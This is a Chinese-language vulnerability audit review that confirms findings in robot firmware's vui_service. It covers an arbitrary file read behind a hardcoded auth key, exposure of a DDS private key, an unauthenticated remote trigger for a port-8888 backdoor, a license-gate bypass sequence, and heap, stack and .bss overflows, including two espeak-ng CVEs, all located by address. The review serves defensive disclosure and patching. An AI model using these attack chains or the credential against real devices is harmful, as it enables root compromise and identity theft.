| AUD-audiodetect-02 任意文件读 | **CONFIRMED** | `module/vui_service/bin/audio_detect.py:60-75` 逐行相符：`path` 直取（:62)，唯一门槛是 `os.path.exists`(:63)，发 size(:66)、忽略确认 recv(:68)、`open(rb)`+分块回传（:70-72)、`FILE_NOT_FOUND`(:75)；全文无目录限定/后缀检查，`AUTH_KEY="unitree123"`(:12)。皇冠目标属实：`etc/ds/pVKdbS1fQJ9a.crt` 确为 `BEGIN RSA PRIVATE KEY`(1679B)，且被 `etc/cyclonedds.xml` 的 `<PrivateKey>` 引用；服务以 root 跑（`etc/master_service/service/vui_service` 无 `--chuid`) | **有增量价值**：我们真机实证的 01 是 `exec_cmd`(:42）命令执行；02 是同文件内独立的纯血任意读原语（IO 类），确实存在，之前独立排查漏掉了。读 DDS 私钥 → 永久域 0 身份，是 01 之外的独立影响 |
| AUD-audiodetect-03 keys=38 无门控拉起 | **CONFIRMED** | `handler_joystick@0x16fed8`：双样本判定（last_keys `cmp #0x26` @0x1702b8 + 当前 keys @0x1702c4)→ `vui_data=10` 存储 @0x1702fc-0x170300，分支内**无** `vui_param`/license 检查；对照组 keys==40(@0x17011c `cmp #3;b.eq`）与 keys==10(@0x170220）确有门控——差异成立。`FSM1_run` 状态 10(`cmp #0xa` @0x2968e4 → arm @0x2976f4）在 @0x297740 调 PLT 0x10bf70（已解析=**system**)，字符串 @0x12ece60 = `python3 /unitree/module/vui_service/bin/audio_detect.py &`。现场日志 `vui_log.txt:49542-49543` 在 mode 3 下触发。远程面：`webrtc_bridge.LOG:5386` 确有 `rt/wirelesscontroller` publisher 注册 | 把我们已知的 8888 后门从"需物理按键/已运行"升级为**可无认证远程武装**(DDS 或 WebRTC 链发两次 keys=38)；是 01/02 的触发器，非重复 |
| AUD-vui-voice1003-limiter-heapoverflow | **CONFIRMED**（静态；未实机触发） | `Audio_algorithm::limiter_proc@0x167074` 拷贝循环 @0x1671a8-0x167208：计数器只与输入 `vector::size`(@0x16715c）比较，下标=i+left_len,@0x1671f0 调 unchecked `operator[]`,@0x1671f8 `strh` 写入，全程无比 buffer.size()。缓冲尺寸硬编码 80000 shorts(`mov w1,#0x3880;movk w1,#1,lsl#16` @0x131cc4-0x131cc8=0x13880)。唯一门控是 `audioLoopDown` 空指针早退（@0x16716c-0x167180)；且审计机自身日志证明该门已被无认证 keys==55 序列打开：`vui_log.txt:104-106`(lic_active:1)+`:136`(rkauth_tool_get_licence successful) | 全新面（我们 11 路分析未覆盖 vui_service 的 api 1003):root 进程堆溢出，长度+内容全控；license 门可用 03 的同源 DDS 原语自行翻开，门不是认证控制 |
| AUD-espeak-punctlist-bss-overflow(CVE-2023-49993) | **CONFIRMED** | `ReadClause@0x529508` 内 `\x01B` 拷贝循环 @0x52a2f8-0x52a36c：两处 wchar 存（@0x52a318/@0x52a36c),j 只增（@0x52a33c）无上界比较，退出仅靠 `iswspace`(PLT 0x10ad20)/EOF;OOB NUL @0x52a43c。版本串 `1.52.0.1` @0x1359258;.bss 符号地址逐一如报告：`option_punctlist@0x192b000`、`option_ssml@0x192b0f4`、`voices_list@0x192b140`。500B 段帽实存（`cmp #0x1f3` @0x16e238);EN 模型在镜像内（`module/vui_module/tts/en/`);api 1001 路径无 license 门 | 已知 CVE 的 vendored fork 实例，部署面新：无认证 DDS(api 1001, speaker_id≠0 选 EN/espeak）直达 root 进程 .bss 线性溢出；两条消息即可稳定 crash,62 字符可精确翻转 option_ssml 开 SSML 子引擎 |
| AUD-espeak-removeending-stack-overflow(CVE-2023-49992) | **CONFIRMED** | `RemoveEnding@0x523930`:`sub w24`（词长）@0x5239a4 → `cbz x3`(NULL 检查）→ `sxtw` **无 clamp** → @0x5239b8 `bl 0x10a900`（已解析=**memcpy**)→ @0x5239bc NUL 写。调用点实证：`TranslateWord3` 内 `add x27,sp,#0x1d8;mov x3,x27;bl RemoveEnding` @0x53e9e0-0x53e9f4，目的=160B 栈缓冲 word_copy@frame+0x1D8。上游修复 `b99f332c57` 的 `i>=N_WORD_BYTES` 钳制缺失 | 同上 vendored fork；报告自我定界准确：500B 段帽使 canary(frame+0x7C8，距 1520B）不可达 → 实质为 ~336B 栈控写+音素串注入，crash 级 DoS,HIGH 定级合理，无 RIP 控制声称 |

补充说明：
- 报告中的"实证"范围声明是诚实的——02 的 /etc/passwd 读取是在审计宿主机上对未改动脚本跑的（3695B 为宿主机特征），但 16 行代码逐行核对后该原语原样适用于设备（同代码、root 凭据）。
- 03 的"全远程武装"修正（经 webrtc_bridge 的 `rt/wirelesscontroller` writer）已在日志层面核实（LOG:5386 verbatim)；但注意 MQTT 外网腿有 broker ACL 拦截（2026-08-20 实测），所以互联网可达性应表述为"LAN/AP 无条件，外网需 broker 绕过"。
- 三条二进制发现的报告自评"未动态执行"与我们一致——全部为指令级静态确认，我复核中未发现任何夸大；两处（02 的 /data/record/ 路径、03 的 InitChannel 地址引用 0x170ddc vs 0x170d0c）报告已自行修正，不影响裁决。
- 优先建议：02 应并入对厂家的旗舰上报（与 01 合并为"8888 后门"条目但单列任意读原语）;03 作为触发链前置条件引用；espeak 两条按"已修 CVE 未回填"走补丁管理通道，附上 csukuangfj/espeak-ng@ed530aa1 需合并上游 PR #1846。
